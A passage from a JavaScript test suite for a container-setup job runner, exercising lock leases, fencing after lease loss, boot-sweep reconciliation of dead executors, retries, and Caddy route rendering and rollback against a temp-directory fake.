    const ack = acknowledgeUncertainJob(d, { id: 'dead-1', by: 'thomas', writerStopped: true, note: 'pid 4242 gone, rc absent', nowMs: c.nowMs() });
    assert.equal(ack.ok, true); assert.equal(ack.released, 1); assert.equal(readLock(d, 'pp-n'), null);
    assert.equal(getJob(d, 'dead-1').outcome, 'init_uncertain_acknowledged'); assert.equal(phasesOf(d, 'dead-1').init_script.acknowledged, true); assert.equal(phasesOf(d, 'dead-1').init_script.writer.state, 'stopped'); assert.equal(parseJson(getJob(d, 'dead-1').progress_json).completion, 'partial');
    assert.ok(listEvents(d, 'dead-1').some((e) => e.kind === 'acknowledged' && e.data_json && JSON.parse(e.data_json).writer_stopped === true));
    assert.equal(parseJson(getJob(d, 'create-1').progress_json).setup.completion, 'partial');
    // The follow-ups that waited on the hold run once it is gone (their not-before elapses)…
    c.tick(6 * 60_000);
    await runAll(d, exec(h, g), c, { inputsDir });
    assert.equal(getJob(d, follow.id).status, 'succeeded', 'the waiting follow-up ran once the hold was gone');
    assert.equal(getJob(d, rawRetry.id).status, 'failed', 'the waiting retry ran too — and kept the (acknowledged) uncertain init: still not complete'); assert.equal(getJob(d, rawRetry.id).outcome, 'setup_partial'); assert.equal(g.calls.filter((x) => x.phase === 'init').length, 0);
    // … and an operator's start is accepted and runs.
    const start = submitRunnerJob(d, { kind: 'instance_start', app: 'pp-n', params: { container: 'pp-n' }, nowMs: c.nowMs() });
    assert.ok(start.job, `a start after the acknowledgement is accepted: ${start.error}`);
    await runAll(d, exec(h, g), c);
    assert.equal(getJob(d, start.job.id).status, 'succeeded');
    // A retry after the acknowledgement never repeats the script and stays partial: no new hold.
    const retry = createJob(d, { kind: 'guest_setup', app: 'pp-n', plan: parseJson(getJob(d, 'dead-1').plan_json), retryOf: 'dead-1', nowMs: c.nowMs() });
    await runAll(d, exec(h, g), c, { inputsDir, kinds: ['guest_setup'] });
    assert.equal(getJob(d, retry.id).status, 'failed'); assert.equal(getJob(d, retry.id).outcome, 'setup_partial');
    assert.deepEqual([phasesOf(d, retry.id).init_script.state, phasesOf(d, retry.id).init_script.notRepeated, phasesOf(d, retry.id).init_script.acknowledged], ['uncertain', true, true]);
    assert.match(phasesOf(d, retry.id).init_script.detail, /unknown outcome \(acknowledged\) in the attempt this job retries/);
    assert.equal(g.calls.filter((x) => x.phase === 'init').length, 0); assert.equal(readLock(d, 'pp-n'), null, 'a resolved condition takes no new hold');
  }
  // (c2) the recorded writer is gone but no exit code was recorded: completion unknown → still held.
  {
    const c = clock(); const { d, h, g } = mk({ guestRc: null, guestDead: 4242 });
    deadSetup(d, { params: { container: 'pp-n', phases: ['init_script'], expect: { uuid: UUID_B }, initScript: script }, cp });
    reconcile({ db: d, owner: RUNNER, nowMs: T0 });
    await runAll(d, exec(h, g), c, { inputsDir });
    assert.equal(getJob(d, 'dead-1').outcome, 'init_uncertain'); assert.deepEqual(phasesOf(d, 'dead-1').init_script.writer, { state: 'stopped', pid: 4242 }); holdOn(d, 'pp-n', 'dead-1');
  }
  // (d) the backend's boot sweep for a dead in-process executor: uncertain, HELD, never re-run.
  {
    const { d } = mk({});
    deadSetup(d, { params: { container: 'pp-n', phases: ['init_script'], expect: { uuid: UUID_B }, initScript: script }, cp, owner: DEAD_BACKEND });
    const dec = reconcileDecision({ job: getJob(d, 'dead-1'), lock: readLock(d, 'pp-n'), nowMs: T0, canAct: false });
    assert.equal(dec.action, 'record_uncertain'); assert.equal(dec.setup, true);
    const swept = sweepSetupEngineOnBoot(d, { owner: BACKEND, nowMs: T0 });
    assert.deepEqual(swept.interrupted, ['dead-1']);
    assert.equal(getJob(d, 'dead-1').status, 'recovery_required'); assert.equal(getJob(d, 'dead-1').outcome, 'init_uncertain');
    holdOn(d, 'pp-n', 'dead-1');
    assert.equal(phasesOf(d, 'dead-1').init_script.state, 'uncertain'); assert.equal(phasesOf(d, 'dead-1').network_nat.state, 'done', 'what was done stays on the record'); assert.equal(parseJson(getJob(d, 'dead-1').progress_json).completion, 'uncertain');
    assert.equal(submitRunnerJob(d, { kind: 'instance_delete', app: 'pp-n', params: { container: 'pp-n' }, nowMs: T0 }).code, 'CONTAINER_LOCK_STALE');
    // A lease row that had already expired and been removed still gets the hold written in the dead owner's name.
    const { d: d2 } = mk({});
    deadSetup(d2, { params: { container: 'pp-n', phases: ['init_script'], expect: { uuid: UUID_B }, initScript: script }, cp, owner: DEAD_BACKEND });
    d2.exec(`DELETE FROM setup_locks WHERE app = 'pp-n'`);
    sweepSetupEngineOnBoot(d2, { owner: BACKEND, nowMs: T0 });
    holdOn(d2, 'pp-n', 'dead-1');
  }
});

test('a dead backend mid-routes: the boot sweep records the routes job interrupted, marks the setup\'s routes phase failed and settles the setup PARTIAL (its lifecycle parent too); a retry of the routes job re-renders, never duplicates a row, and settles it COMPLETE (real schema, fake render)', async (t) => {
  const d = db(); ensureRoutesSchema(d);
  createJob(d, { id: 'create-1', kind: 'instance_create', app: 'pp-n', plan: { steps: [], params: { container: 'pp-n', image: 'images:debian/12' } }, status: 'succeeded', nowMs: T0 - 11_000 });
  createJob(d, { id: 'setup-1', kind: 'guest_setup', app: 'pp-n', plan: { steps: [], params: { container: 'pp-n', phases: ['routes'], services: SERVICES, serviceName: 'n', origin: { jobId: 'create-1', kind: 'instance_create' } } }, status: 'succeeded', nowMs: T0 - 10_000 });
  d.prepare(`UPDATE setup_jobs SET outcome = 'setup_pending', progress_json = ? WHERE id = 'setup-1'`).run(JSON.stringify({ phases: { network_nat: { state: 'done' }, routes: { state: 'pending' } }, completion: 'pending', address: { ip: '10.10.10.7' } }));
  createJob(d, { id: 'routes-1', kind: 'configure_routes', app: 'pp-n', plan: { steps: [], params: { container: 'pp-n', serviceName: 'n', ip: '10.10.10.7', services: SERVICES, origin: { jobId: 'setup-1', kind: 'guest_setup', createJobId: 'create-1' } } }, nowMs: T0 - 9_000 });
  const c1 = claimNextJob(d, { owner: DEAD_BACKEND, kinds: ['configure_routes'], nowMs: T0 - 80_000 });
  checkpoint(d, { id: 'routes-1', owner: DEAD_BACKEND, epoch: c1.epoch, phase: 'routes', checkpoint: { resumable: false, disruptive: false, routes: true }, nowMs: T0 - 70_000 });
  const swept = sweepSetupEngineOnBoot(d, { owner: BACKEND, nowMs: T0 });
  assert.deepEqual(swept.interrupted, ['routes-1']); assert.equal(getJob(d, 'routes-1').outcome, 'interrupted');
  assert.equal(phasesOf(d, 'setup-1').routes.state, 'failed'); assert.match(phasesOf(d, 'setup-1').routes.detail, /backend died while configuring the routes/);
  assert.equal(getJob(d, 'setup-1').outcome, 'setup_partial', 'the aggregate is settled on the setup record'); assert.equal(parseJson(getJob(d, 'setup-1').progress_json).completion, 'partial'); assert.equal(getJob(d, 'setup-1').status, 'succeeded', 'execution status stays what it was');
  assert.deepEqual(parseJson(getJob(d, 'create-1').progress_json).setup, { job: 'setup-1', outcome: 'setup_partial', completion: 'partial', phases: { network_nat: 'done', routes: 'failed' } }, 'the lifecycle parent sees it');
  // The retry, through the real guest-routes over the real tables and a fake render.
  const rendered = []; const render = fakeRender(rendered);
  const deps = { configureRoutes: (args) => configureGuestRoutes(d, { name: args.name, ip: args.ip, services: args.services, render, fence: args.fence }) };
  createJob(d, { id: 'routes-2', kind: 'configure_routes', app: 'pp-n', plan: parseJson(getJob(d, 'routes-1').plan_json), retryOf: 'routes-1', nowMs: T0 });
  let out = await runBackendSteps({ db: d, owner: BACKEND, deps, nowMs: () => T0 + 1 });
  assert.equal(out.ran[0].status, 'succeeded'); assert.deepEqual(out.ran[0].result.created, ['app.example.test', 'api.example.test']); assert.deepEqual(rendered.splice(0), [['app.example.test', 'api.example.test']]);
  assert.equal(phasesOf(d, 'setup-1').routes.state, 'done');
  assert.equal(getJob(d, 'setup-1').outcome, 'setup_complete'); assert.equal(parseJson(getJob(d, 'setup-1').progress_json).completion, 'complete'); assert.equal(parseJson(getJob(d, 'create-1').progress_json).setup.completion, 'complete');
  assert.equal(d.prepare(`SELECT COUNT(*) AS n FROM service_http_routes`).get().n, 2);
  assert.equal(d.prepare(`SELECT target_ip, lxc_container_name FROM services`).get().target_ip, '10.10.10.7');
  // Run it once more (an operator's second retry): existing, re-rendered, no duplicate.
  createJob(d, { id: 'routes-3', kind: 'configure_routes', app: 'pp-n', plan: parseJson(getJob(d, 'routes-1').plan_json), retryOf: 'routes-2', nowMs: T0 + 2 });
  out = await runBackendSteps({ db: d, owner: BACKEND, deps, nowMs: () => T0 + 3 });
  assert.deepEqual(out.ran[0].result.existing, ['app.example.test', 'api.example.test']); assert.deepEqual(out.ran[0].result.created, []);
  assert.equal(d.prepare(`SELECT COUNT(*) AS n FROM service_http_routes`).get().n, 2); assert.deepEqual(rendered, [['app.example.test', 'api.example.test']]);
  assert.equal(readLock(d, 'pp-n'), null); assert.equal(readLock(d, HOST_ROUTES_LOCK), null);
});

test('a failed route render keeps the setup PARTIAL on every record; a render that succeeds later settles it complete; a routes job that loses a lease mid-way writes nothing further (fenced)', async (t) => {
  const d = db();
  createJob(d, { id: 'create-1', kind: 'instance_create', app: 'pp-n', plan: { steps: [], params: { container: 'pp-n', image: 'images:debian/12' } }, status: 'succeeded', nowMs: T0 - 11_000 });
  createJob(d, { id: 'setup-1', kind: 'guest_setup', app: 'pp-n', plan: { steps: [], params: { container: 'pp-n', phases: ['dns', 'routes'], services: SERVICES, serviceName: 'n', origin: { jobId: 'create-1', kind: 'instance_create' } } }, status: 'succeeded', nowMs: T0 - 10_000 });
  d.prepare(`UPDATE setup_jobs SET outcome = 'setup_pending', progress_json = ? WHERE id = 'setup-1'`).run(JSON.stringify({ phases: { dns: { state: 'done' }, routes: { state: 'pending' } }, completion: 'pending' }));
  const mk = (id, retryOf = null) => createJob(d, { id, kind: 'configure_routes', app: 'pp-n', plan: { steps: [], params: { container: 'pp-n', serviceName: 'n', ip: '10.10.10.7', services: SERVICES, origin: { jobId: 'setup-1', kind: 'guest_setup', createJobId: 'create-1' } } }, retryOf, nowMs: T0 });
  mk('r-1');
  let out = await runBackendSteps({ db: d, owner: BACKEND, deps: { configureRoutes: async () => ({ created: ['app.example.test', 'api.example.test'], rendered: [], renderWarning: 'Routes were recorded but Caddy was not updated: caddy adapt: syntax' }) }, nowMs: () => T0 + 1 });
  assert.equal(out.ran[0].status, 'failed'); assert.equal(out.ran[0].outcome, 'routes_recorded_render_failed');
  assert.equal(phasesOf(d, 'setup-1').routes.state, 'failed'); assert.equal(getJob(d, 'setup-1').outcome, 'setup_partial'); assert.equal(parseJson(getJob(d, 'setup-1').progress_json).completion, 'partial');
  assert.equal(parseJson(getJob(d, 'create-1').progress_json).setup.completion, 'partial'); assert.equal(parseJson(getJob(d, 'create-1').progress_json).setup.phases.routes, 'failed');
  const view = createStatusView({ create: jobView(getJob(d, 'create-1')), setup: jobView(getJob(d, 'setup-1')), routes: jobView(getJob(d, 'r-1')), nowMs: T0 });
  assert.equal(view.completion, 'partial'); assert.match(view.caddyWarning, /Caddy was not updated/);
  mk('r-2', 'r-1');
  out = await runBackendSteps({ db: d, owner: BACKEND, deps: { configureRoutes: async () => ({ created: [], existing: ['app.example.test', 'api.example.test'], rendered: ['app.example.test', 'api.example.test'] }) }, nowMs: () => T0 + 2 });
  assert.equal(out.ran[0].status, 'succeeded'); assert.equal(getJob(d, 'setup-1').outcome, 'setup_complete'); assert.equal(parseJson(getJob(d, 'setup-1').progress_json).completion, 'complete'); assert.equal(parseJson(getJob(d, 'create-1').progress_json).setup.completion, 'complete');
  // The fence: the route store's lease taken by another owner between two writes.
  const writes = [];
  mk('r-3', 'r-2');
  out = await runBackendSteps({ db: d, owner: BACKEND, deps: { configureRoutes: async ({ fence }) => { fence(); writes.push('row-1'); d.exec(`UPDATE setup_locks SET owner = '${OTHER}', epoch = epoch + 1 WHERE app = '${HOST_ROUTES_LOCK}'`); fence(); writes.push('row-2'); return { created: ['x'] }; } }, nowMs: () => T0 + 3 });
  assert.equal(out.ran[0].status, 'failed'); assert.equal(out.ran[0].outcome, 'lease_lost'); assert.deepEqual(writes, ['row-1'], 'nothing is written after the lease is lost');
  assert.equal(phasesOf(d, 'setup-1').routes.state, 'failed'); assert.match(phasesOf(d, 'setup-1').routes.detail, /lease is no longer this job's/); assert.equal(parseJson(getJob(d, 'setup-1').progress_json).completion, 'partial');
  assert.equal(readLock(d, HOST_ROUTES_LOCK).owner, OTHER, 'the other owner\'s lease is untouched'); assert.equal(readLock(d, 'pp-n'), null);
  // The guest's own lease lost the same way, through the real configurator: no row is inserted.
  const d2 = db(); ensureRoutesSchema(d2);
  createJob(d2, { id: 'r-4', kind: 'configure_routes', app: 'pp-n', plan: { steps: [], params: { container: 'pp-n', serviceName: 'n', ip: '10.10.10.7', services: SERVICES } }, nowMs: T0 });
  const render = fakeRender([]);
  out = await runBackendSteps({ db: d2, owner: BACKEND, deps: { configureRoutes: (args) => { d2.exec(`UPDATE setup_locks SET owner = '${OTHER}', epoch = epoch + 1 WHERE app = 'pp-n'`); return configureGuestRoutes(d2, { name: args.name, ip: args.ip, services: args.services, render, fence: args.fence }); } }, nowMs: () => T0 + 4 });
  assert.equal(out.ran[0].outcome, 'lease_lost'); assert.equal(d2.prepare(`SELECT COUNT(*) AS n FROM services`).get().n, 0, 'not even the service row'); assert.equal(d2.prepare(`SELECT COUNT(*) AS n FROM service_http_routes`).get().n, 0);
});

// A Caddy over a temp dir: site files really written from the rows (so a
// file's content says whose render it is), adapt / reload counted, hooks for
// what a test injects at each step — the only thing the production route
// path does not run here is the caddy binary.
function caddyDir(dir, hooks = {}) {
  const log = { adapt: 0, reload: 0, regenerated: [], writes: [], removes: [] };
  const caddyFilePath = (dom) => join(dir, `${dom}.caddy`);
  const render = {
    regenerate: async (db, domain) => {
      const row = db.prepare(`SELECT r.domain, r.target_port, s.target_ip FROM service_http_routes r JOIN services s ON s.id = r.service_id WHERE r.domain = ? AND r.path_prefix = '/'`).get(domain);
      log.regenerated.push(domain); writeFileSync(caddyFilePath(domain), `${domain} { reverse_proxy ${row.target_ip}:${row.target_port} } # by ${BACKEND}\n`);
      if (hooks.afterRegenerate) await hooks.afterRegenerate(domain, log);
    },
    adapt: async () => { log.adapt += 1; if (hooks.adapt) await hooks.adapt(log); },
    reload: async () => { log.reload += 1; if (hooks.reload) await hooks.reload(log); },
    caddyFilePath,
    writeConfig: async (path, content) => { log.writes.push(path); writeFileSync(path, content); },
    removeConfig: async (path) => { log.removes.push(path); rmSync(path, { force: true }); },
  };
  return { log, render, file: (dom) => (existsSync(caddyFilePath(dom)) ? readFileSync(caddyFilePath(dom), 'utf8') : null) };
}
// A create → setup (routes pending) → configure_routes chain over the real
// route tables, ready for the backend's drain.
function seedRoutesChain(d, { ip = '10.10.10.7', services = SERVICES, id = 'routes-1' } = {}) {
  ensureRoutesSchema(d);
  createJob(d, { id: 'create-1', kind: 'instance_create', app: 'pp-n', plan: { steps: [], params: { container: 'pp-n', image: 'images:debian/12' } }, status: 'succeeded', nowMs: T0 - 11_000 });
  createJob(d, { id: 'setup-1', kind: 'guest_setup', app: 'pp-n', plan: { steps: [], params: { container: 'pp-n', phases: ['routes'], services, serviceName: 'n', origin: { jobId: 'create-1', kind: 'instance_create' } } }, status: 'succeeded', nowMs: T0 - 10_000 });
  d.prepare(`UPDATE setup_jobs SET outcome = 'setup_pending', progress_json = ? WHERE id = 'setup-1'`).run(JSON.stringify({ phases: { network_nat: { state: 'done' }, routes: { state: 'pending', job: id } }, completion: 'pending', address: { ip } }));
  createJob(d, { id, kind: 'configure_routes', app: 'pp-n', plan: { steps: [], params: { container: 'pp-n', serviceName: 'n', ip, services, origin: { jobId: 'setup-1', kind: 'guest_setup', createJobId: 'create-1' } } }, nowMs: T0 - 9_000 });
  return id;
}
const takeOver = (d, app) => { d.exec(`UPDATE setup_locks SET owner = '${OTHER}', epoch = epoch + 1 WHERE app = '${app}'`); return readLock(d, app); };
const settledPartial = (d) => { assert.equal(phasesOf(d, 'setup-1').routes.state, 'failed'); assert.equal(getJob(d, 'setup-1').outcome, 'setup_partial'); assert.equal(parseJson(getJob(d, 'create-1').progress_json).setup.completion, 'partial'); };

test('route ownership through the PRODUCTION adapter (ops backendStepDeps → guest-routes → route-render, real tables, a Caddy over a temp dir): the site files are rendered from the rows, validated and reloaded once, and the setup settles complete', async (t) => {
  const d = db(); const dir = tmp(); const caddy = caddyDir(dir); const h = scriptedHost({ instances: [] }); const g = scriptedGuest({});
  t.after(() => { configureContainerLockStore(null); rmSync(dir, { recursive: true, force: true }); });
  opsStore(d, h, g, { renderDeps: caddy.render });
  assert.equal(containerLockStore().configureRoutes, null, 'no configurator of the test\'s own: the production adapter runs'); assert.equal(containerLockStore().renderDeps, caddy.render);
  const id = seedRoutesChain(d);
  const out = await drainBackendStepsNow(undefined, { nowMs: () => T0 });
  assert.equal(out.ran.length, 1); assert.equal(out.ran[0].status, 'succeeded', getJob(d, id).reason); assert.equal(out.ran[0].outcome, 'routes_configured');
  assert.deepEqual(out.ran[0].result.created, ['app.example.test', 'api.example.test']); assert.deepEqual(out.ran[0].result.rendered, ['app.example.test', 'api.example.test']);
  assert.match(caddy.file('app.example.test'), /reverse_proxy 10\.10\.10\.7:3000/); assert.match(caddy.file('api.example.test'), /reverse_proxy 10\.10\.10\.7:8080/);
  assert.deepEqual([caddy.log.adapt, caddy.log.reload, caddy.log.regenerated], [1, 1, ['app.example.test', 'api.example.test']]);
  assert.equal(d.prepare(`SELECT COUNT(*) AS n FROM service_http_routes`).get().n, 2); assert.deepEqual(d.prepare(`SELECT name, lxc_container_name, target_ip FROM services`).all().map((r) => ({ ...r })), [{ name: 'n', lxc_container_name: 'n', target_ip: '10.10.10.7' }], 'the guest\'s one services row, keyed by its service name as the dashboard always keyed it');
  assert.equal(getJob(d, 'setup-1').outcome, 'setup_complete'); assert.equal(parseJson(getJob(d, 'create-1').progress_json).setup.completion, 'complete');
  assert.equal(readLock(d, 'pp-n'), null); assert.equal(readLock(d, HOST_ROUTES_LOCK), null);
});

test('route ownership through the PRODUCTION adapter: the lease taken BEFORE any mutation → nothing is written (no row, no file, no adapt); taken DURING a multi-domain render → the next domain is not rendered, nothing is validated or reloaded, NO rollback touches what is now the new owner\'s, and the new owner\'s lease is untouched; the setup settles partial and truthfully names the lost lease', async (t) => {
  const h = scriptedHost({ instances: [] }); const g = scriptedGuest({}); const dirs = [];
  t.after(() => { configureContainerLockStore(null); for (const x of dirs) rmSync(x, { recursive: true, force: true }); });
  // 1) Before any mutation: the routes lease is taken the moment this job holds it, before its first fence.
  {
    const d = db(); const dir = tmp(); dirs.push(dir); const caddy = caddyDir(dir);
    opsStore(d, h, g, { renderDeps: caddy.render }); const id = seedRoutesChain(d);
    let taken = null; let n = 0;
    const nowMs = () => { if (!taken && readLock(d, HOST_ROUTES_LOCK)?.owner === BACKEND) taken = takeOver(d, HOST_ROUTES_LOCK); return T0 + (n += 1); };
    const out = await drainBackendStepsNow(undefined, { nowMs });
    assert.equal(out.ran[0].status, 'failed'); assert.equal(out.ran[0].outcome, 'lease_lost'); assert.match(getJob(d, id).reason, /@host\/routes lease is no longer this job's/);
    assert.equal(d.prepare(`SELECT COUNT(*) AS n FROM services`).get().n, 0, 'not even the service row'); assert.equal(d.prepare(`SELECT COUNT(*) AS n FROM service_http_routes`).get().n, 0);
    assert.deepEqual([caddy.log.adapt, caddy.log.reload, caddy.log.regenerated, caddy.log.writes, caddy.log.removes], [0, 0, [], [], []]); assert.equal(caddy.file('app.example.test'), null);
    const l = readLock(d, HOST_ROUTES_LOCK); assert.equal(l.owner, OTHER); assert.equal(l.epoch, taken.epoch, 'the new owner\'s lease, epoch and all, is untouched by the fenced worker'); assert.equal(readLock(d, 'pp-n'), null, 'this job\'s own lease is released');
    settledPartial(d); assert.match(phasesOf(d, 'setup-1').routes.detail, /lease is no longer this job's/);
  }
  // 2) During the render: the GUEST lease is taken after the first domain's site file is written.
  {
    const d = db(); const dir = tmp(); dirs.push(dir); let taken = null;
    const caddy = caddyDir(dir, { afterRegenerate: async (domain) => { if (domain === 'app.example.test') { taken = takeOver(d, 'pp-n'); writeFileSync(join(dir, 'app.example.test.caddy'), `app.example.test { reverse_proxy 10.10.10.9:3000 } # by ${OTHER}\n`); } } });
    opsStore(d, h, g, { renderDeps: caddy.render }); const id = seedRoutesChain(d);
    const out = await drainBackendStepsNow(undefined, { nowMs: () => T0 });
    assert.equal(out.ran[0].outcome, 'lease_lost'); assert.match(getJob(d, id).reason, /pp-n lease is no longer this job's/);
    assert.deepEqual(caddy.log.regenerated, ['app.example.test'], 'the second domain is never rendered'); assert.equal(caddy.log.adapt, 0, 'nothing validated'); assert.equal(caddy.log.reload, 0, 'nothing reloaded');
    assert.deepEqual([caddy.log.writes, caddy.log.removes], [[], []], 'no rollback write or removal after the loss');
    assert.match(caddy.file('app.example.test'), new RegExp(`10\\.10\\.10\\.9:3000 \\} # by ${OTHER}`), 'the new owner\'s file stands (a rollback would have removed it)'); assert.equal(caddy.file('api.example.test'), null);
    assert.equal(d.prepare(`SELECT COUNT(*) AS n FROM service_http_routes`).get().n, 2, 'the rows written before the loss stay for the owner to render (a retry re-renders, never duplicates)');
    const l = readLock(d, 'pp-n'); assert.equal(l.owner, OTHER); assert.equal(l.epoch, taken.epoch); assert.equal(readLock(d, HOST_ROUTES_LOCK), null);
    settledPartial(d);
  }
});

test('route ownership through the PRODUCTION adapter, the failure path: a render that fails with ownership INTACT rolls every site file back and reloads the known-good config (routes_recorded_render_failed, rows kept); a render that fails AFTER the lease was taken rolls nothing back — the new owner\'s files and its upstream row are not overwritten by the stale worker — and is recorded as the lease loss it is', async (t) => {
  const h = scriptedHost({ instances: [] }); const g = scriptedGuest({}); const dirs = [];
  t.after(() => { configureContainerLockStore(null); for (const x of dirs) rmSync(x, { recursive: true, force: true }); });
  // 1) Ownership intact: adapt rejects the generated config.
  {
    const d = db(); const dir = tmp(); dirs.push(dir);
    const caddy = caddyDir(dir, { adapt: async () => { const e = new Error('caddy adapt'); e.stderr = 'syntax error at line 3'; throw e; } });
    writeFileSync(join(dir, 'app.example.test.caddy'), 'app.example.test { respond "known good" }\n');
    opsStore(d, h, g, { renderDeps: caddy.render }); const id = seedRoutesChain(d);
    const out = await drainBackendStepsNow(undefined, { nowMs: () => T0 });
    assert.equal(out.ran[0].status, 'failed'); assert.equal(out.ran[0].outcome, 'routes_recorded_render_failed', getJob(d, id).reason);
    assert.match(out.ran[0].result.renderWarning, /Caddy was not updated: Generated Caddy config failed validation: syntax error at line 3/);
    assert.deepEqual(caddy.log.regenerated, ['app.example.test', 'api.example.test']); assert.equal(caddy.log.adapt, 1); assert.equal(caddy.log.reload, 1, 'the rollback reloads the known-good config');
    assert.deepEqual(caddy.log.writes, [join(dir, 'app.example.test.caddy')], 'the pre-existing file is put back'); assert.deepEqual(caddy.log.removes, [join(dir, 'api.example.test.caddy')], 'the new one is removed');
    assert.equal(caddy.file('app.example.test'), 'app.example.test { respond "known good" }\n'); assert.equal(caddy.file('api.example.test'), null);
    assert.equal(d.prepare(`SELECT COUNT(*) AS n FROM service_http_routes`).get().n, 2, 'the rows stay: a retry renders them again');
    settledPartial(d); assert.match(phasesOf(d, 'setup-1').routes.detail, /Caddy was not updated/);
    assert.equal(readLock(d, 'pp-n'), null); assert.equal(readLock(d, HOST_ROUTES_LOCK), null);
  }
  // 2) Ownership lost at the validation: the new owner has already moved the
  // upstream and rewritten a site file when adapt fails for the stale worker.
  {
    const d = db(); const dir = tmp(); dirs.push(dir); let taken = null;
    const caddy = caddyDir(dir, { adapt: async () => { taken = takeOver(d, HOST_ROUTES_LOCK); d.prepare(`UPDATE services SET target_ip = '10.10.10.9' WHERE id = 'svc-n'`).run(); writeFileSync(join(dir, 'app.example.test.caddy'), `app.example.test { reverse_proxy 10.10.10.9:3000 } # by ${OTHER}\n`); const e = new Error('caddy adapt'); e.stderr = 'connection reset'; throw e; } });
    opsStore(d, h, g, { renderDeps: caddy.render }); const id = seedRoutesChain(d);
    // The service already exists at an older address with one route: the step moves the upstream first (the same fenced render).
    d.prepare(`INSERT INTO services (id, name, kind, runtime, target_ip, lxc_container_name, type, status) VALUES ('svc-n', 'n', 'container_service', 'lxc', '10.10.10.6', 'n', 'docker', 'active')`).run();
    d.prepare(`INSERT INTO service_http_routes (id, service_id, domain, path_prefix, target_port) VALUES ('r-app', 'svc-n', 'app.example.test', '/', 3000)`).run();
    writeFileSync(join(dir, 'app.example.test.caddy'), 'app.example.test { reverse_proxy 10.10.10.6:3000 } # old\n');
    const out = await drainBackendStepsNow(undefined, { nowMs: () => T0 });
    assert.equal(out.ran[0].outcome, 'lease_lost', getJob(d, id).reason); assert.match(getJob(d, id).reason, /@host\/routes lease is no longer this job's/);
    assert.deepEqual(caddy.log.regenerated, ['app.example.test'], 'the upstream move re-rendered what the service served; the loss ended it there'); assert.equal(caddy.log.adapt, 1); assert.equal(caddy.log.reload, 0, 'no reload of a rollback');
    assert.deepEqual([caddy.log.writes, caddy.log.removes], [[], []], 'the rollback wrote nothing: the files are the new owner\'s');
    assert.match(caddy.file('app.example.test'), new RegExp(`10\\.10\\.10\\.9:3000 \\} # by ${OTHER}`), 'the new owner\'s site file stands');
    assert.equal(d.prepare(`SELECT target_ip FROM services WHERE id = 'svc-n'`).get().target_ip, '10.10.10.9', 'the new owner\'s upstream row is not reverted by the stale worker');
    assert.equal(d.prepare(`SELECT COUNT(*) AS n FROM service_http_routes`).get().n, 1, 'no route row was added after the loss');
    const l = readLock(d, HOST_ROUTES_LOCK); assert.equal(l.owner, OTHER); assert.equal(l.epoch, taken.epoch); assert.equal(readLock(d, 'pp-n'), null);
    settledPartial(d); assert.match(phasesOf(d, 'setup-1').routes.detail, /lease is no longer this job's/);
  }
});

test('route ownership through the PRODUCTION adapter: both leases are RENEWED while a legitimately long validation runs (the clock passes the lease period many times over) — no other job can take either meanwhile, and the step completes; a renewal that fails between writes stops the next write', async (t) => {
  const h = scriptedHost({ instances: [] }); const g = scriptedGuest({}); const dirs = [];
  t.after(() => { configureContainerLockStore(null); for (const x of dirs) rmSync(x, { recursive: true, force: true }); });
  {
    const d = db(); const dir = tmp(); dirs.push(dir); const c = clock(); const probes = [];
    const caddy = caddyDir(dir, { adapt: async () => { for (let i = 0; i < 5; i += 1) { c.tick(25_000); await new Promise((r) => setTimeout(r, 60)); probes.push({ guest: acquireLock(d, { app: 'pp-n', owner: OTHER, operation: 'instance_stop', jobId: 'o', nowMs: c.nowMs() }).reason, routes: acquireLock(d, { app: HOST_ROUTES_LOCK, owner: OTHER, operation: 'configure_routes', jobId: 'o', nowMs: c.nowMs() }).reason }); } } });
    opsStore(d, h, g, { renderDeps: caddy.render }); const id = seedRoutesChain(d);
    const out = await drainBackendStepsNow(undefined, { nowMs: c.nowMs, keepAliveMs: 20 });
    assert.equal(out.ran[0].status, 'succeeded', getJob(d, id).reason); assert.equal(out.ran[0].outcome, 'routes_configured');
    assert.equal(probes.length, 5); for (const p of probes) assert.deepEqual(p, { guest: 'held', routes: 'held' }, 'renewed, never lapsed: ' + JSON.stringify(probes));
    assert.equal(caddy.log.reload, 1); assert.equal(getJob(d, 'setup-1').outcome, 'setup_complete');
    assert.equal(readLock(d, 'pp-n'), null); assert.equal(readLock(d, HOST_ROUTES_LOCK), null, 'released at the end');
  }
  // The keep-alive finds the guest lease gone (taken while adapt ran): the reload — the next write — is refused.
  {
    const d = db(); const dir = tmp(); dirs.push(dir); const c = clock();
    const caddy = caddyDir(dir, { adapt: async () => { takeOver(d, 'pp-n'); await new Promise((r) => setTimeout(r, 120)); } });
    opsStore(d, h, g, { renderDeps: caddy.render }); seedRoutesChain(d);
    const out = await drainBackendStepsNow(undefined, { nowMs: c.nowMs, keepAliveMs: 20 });
    assert.equal(out.ran[0].outcome, 'lease_lost'); assert.equal(caddy.log.adapt, 1); assert.equal(caddy.log.reload, 0, 'no reload after the keep-alive saw the loss'); assert.deepEqual(caddy.log.writes, []);
    assert.equal(readLock(d, 'pp-n').owner, OTHER); settledPartial(d);
  }
});

test('the JOB CLAIM is heart-beaten with the locks (production adapter, real timer keep-alive, the runner\'s actual reconcile): a render that outlives the claim period three times over keeps the claim and both locks live, reconcile leaves the active job untouched, the reload runs once and the setup settles complete; a claim ended by the reconciler, or re-claimed at a new epoch, while the render waits stops every later write, revives nothing and releases no other owner\'s lock', async (t) => {
  const h = scriptedHost({ instances: [] }); const g = scriptedGuest({}); const dirs = [];
  t.after(() => { configureContainerLockStore(null); for (const x of dirs) rmSync(x, { recursive: true, force: true }); });
  const iso = (ms) => new Date(ms).toISOString();
  const live = (row, c) => !!row && !!row.lease_expires_at && Date.parse(row.lease_expires_at) > c.nowMs();
  // 1) The claim outlives its period (30 s) three times over while the keep-alive runs: the runner's reconcile finds nothing stale.
  {
    const d = db(); const dir = tmp(); dirs.push(dir); const c = clock(); const probes = []; let id;
    const caddy = caddyDir(dir, { adapt: async () => { for (let i = 0; i < 3; i += 1) { c.tick(22_000); await sleepReal(80); const r = reconcile({ db: d, owner: RUNNER, nowMs: c.nowMs() }); const j = getJob(d, id); probes.push({ tick: i, reconcile: [r.requeued, r.interrupted, r.recoveryQueued].flat(), job: { status: j.status, owner: j.owner, live: live(j, c) }, guest: { owner: readLock(d, 'pp-n')?.owner || null, live: live(readLock(d, 'pp-n'), c) }, routes: { owner: readLock(d, HOST_ROUTES_LOCK)?.owner || null, live: live(readLock(d, HOST_ROUTES_LOCK), c) } }); } } });
    opsStore(d, h, g, { renderDeps: caddy.render }); id = seedRoutesChain(d);
    const out = await drainBackendStepsNow(undefined, { nowMs: c.nowMs, keepAliveMs: 20 });
    assert.equal(probes.length, 3);
    for (const p of probes) {
